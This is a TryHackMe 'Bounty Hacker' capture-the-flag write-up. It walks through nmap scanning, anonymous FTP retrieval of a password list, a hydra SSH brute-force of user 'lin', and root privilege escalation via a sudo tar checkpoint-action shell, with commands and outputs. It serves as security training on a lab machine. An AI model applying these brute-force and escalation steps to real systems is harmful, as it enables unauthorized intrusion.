# Bounty Hacker -- Write-up

## Overview
Platform: TryHackMe  
Difficulty: Easy  
Description: You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!  
Type: Boot2Root/Privilege Escalation  

---

## Reconnaissance

**Task 1 - Deploy the machine**  
After deploying the machine, I start with nmap to identify open port and running services on the machine.

    nmap -sC -sV 10.49.144.139

The scan uses `-sC` which runs Nmap default scripts and `-sV` which performs service version detection to gather more detailed information about the target.

    Host is up (0.12s latency).
    Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.5
    | ftp-syst:
    |   STAT:
    | FTP server status:
    |      Connected to ::ffff:192.168.171.38
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 2
    |      vsFTPd 3.0.5 - secure, fast, stable
    |_End of status
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: PASV failed: 550 Permission denied.
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 b7:11:fd:1f:18:98:9c:64:5a:1e:3f:6d:7c:b5:5a:13 (RSA)
    |   256 38:00:17:66:53:58:87:47:91:15:7f:ee:0f:60:1a:48 (ECDSA)
    |_  256 ee:83:a1:f7:40:fc:b1:e5:dd:0e:ac:a0:e4:23:3b:11 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Nmap done: 1 IP address (1 host up) scanned in 26.53 seconds

**Task 2 - Find open ports on the machine**  
After the scan we can see that three ports are open, we also discovered that FTP is accessible and allows anonymous login.

---

## Accessing FTP

Since FTP service allows anonymous login, the next step is to access it.

    ftp 10.49.144.139

    Connected to 10.49.144.139.
    220 (vsFTPd 3.0.5)
    230 Login successful.
    ftp> ls
    -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
    -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt

    ftp> get locks.txt
    ftp> get task.txt

After gaining access to the FTP, i find two files: locks.txt and task.txt.

locks.txt contain:

    rEddrAGON
    ReDdr4g0nSynd!cat3
    Dr@gOn$yn9icat3
    R3DDr46ONSYndIC@Te
    ReddRA60N
    R3dDrag0nSynd1c4te
    dRa6oN5YNDiCATE
    ReDDR4g0n5ynDIc4te
    R3Dr4gOn2044
    RedDr4gonSynd1cat3
    R3dDRaG0Nsynd1c@T3
    Synd1c4teDr@g0n
    reddRAg0N
    REddRaG0N5yNdIc47e
    Dra6oN$yndIC@t3
    4L1mi6H71StHeB357
    rEDdragOn$ynd1c473
    DrAgoN5ynD1cATE
    ReDdrag0n$ynd1cate
    Dr@gOn$yND1C4Te
    RedDr@gonSyn9ic47e
    REd$yNdIc47e
    dr@goN5YNd1c@73
    rEDdrAGOnSyNDiCat3
    r3ddr@g0N
    ReDSynd1ca7e

I suspect this is a password list, here is what task.txt contain:

    1.) Protect Vicious.
    2.) Plan for Red Eye pickup on the moon.

    -lin

**Task 3 - Who wrote the task list?**  
Answer: lin  

Lin is a potential username

---

## Gaining Access to the machine

With a potential username and passwordlist the next step is to find where we can use it, i first thought that there is maybe a login page on http, but after opening it and using gobuster i can't find any login page.

    gobuster dir -u http://10.49.140.211 -w /usr/share/wordlists/dirb/big.txt

With the web route failed, i decided to try ssh next.

Using hydra to bruteforce ssh with lin as the username and the passwordlist we get.

    hydra -l lin -P locks.txt 10.49.144.139 ssh

**Task 4 - What service can you bruteforce with the text file found?**  
Answer: SSH  

Result:
```
└─# hydra -l lin -P locks.txt 10.49.144.139 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-21 02:56:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.49.144.139:22/
[22][ssh] host: 10.49.144.139   login: lin   password: <REDACTED>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-21 02:56:16

```

**Task 5 - What is the users password?**  
Answer: **`<REDACTED>`**  
With the user and password, I successfully logged into the target via SSH.
```
└─# ssh lin@10.49.144.139             
The authenticity of host '10.49.144.139 (10.49.144.139)' can't be established.
ED25519 key fingerprint is SHA256:fxUpmgyrTZQTtjvDxpyci1myj+CqQYTiUH7/y1Clous.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.144.139' (ED25519) to the list of known hosts.
lin@10.49.144.139's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228

```
Now that we succesfully login, next we need to find the user flag
```
lin@ip-10-49-144-139:~/Desktop$ ls
user.txt
lin@ip-10-49-144-139:~/Desktop$ cat user.txt
<REDACTED>
```

**Task 6 - user.txt**  
Answer: **`<REDACTED>`** 
We find the user flag.

## Privilege Escalation
After getting the user flag, I checked the user sudo privileges with `sudo -l`.  
```
lin@ip-10-49-144-139:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-49-144-139:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-49-144-139:
    (root) /bin/tar
lin@ip-10-49-144-139:~/Desktop$ 
```
I found that `/bin/tar` can be run as root with `sudo`. I checked [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) for a potential privilege escalation.  
After finding out we can get a shell when running tar with sudo
`sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
Result:  
```
in@ip-10-49-144-139:~/Desktop$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
[sudo] password for lin: 
tar: Removing leading `/' from member names
# whoami
root
# 
```
And its a success! now we only need to find the root flag.
```
# bash
root@ip-10-49-144-139:/home/lin/Desktop# ls
user.txt
root@ip-10-49-144-139:/home/lin/Desktop# cd /root
root@ip-10-49-144-139:~# ls
root.txt  snap
root@ip-10-49-144-139:~# cat root.txt
<REDACTED>
```
**Task 7 - root.txt**  
Answer: **`<REDACTED>`**  
We get the root flag!

## Conclusion
This is a fun room and in my opinion beginner friendly.

